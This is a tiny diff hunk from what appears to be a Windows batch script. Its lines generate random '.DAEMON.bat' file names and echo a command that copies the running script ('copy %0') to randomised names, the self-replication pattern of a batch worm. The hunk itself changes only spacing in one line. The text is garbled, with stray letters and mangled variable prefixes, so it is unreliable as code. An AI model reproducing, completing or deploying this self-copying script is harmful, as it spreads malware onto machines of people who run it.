@@ -217,7 +217,7 @@ O
 H
 O
 14"d8=%random%%random%%random%%random%.DAEMON.bat"
-14"8=> d8"
+14"8= > d8"
 echo :r8
 echo set "ur5=copy %0 XD.%random%.%08"
 echo ur58
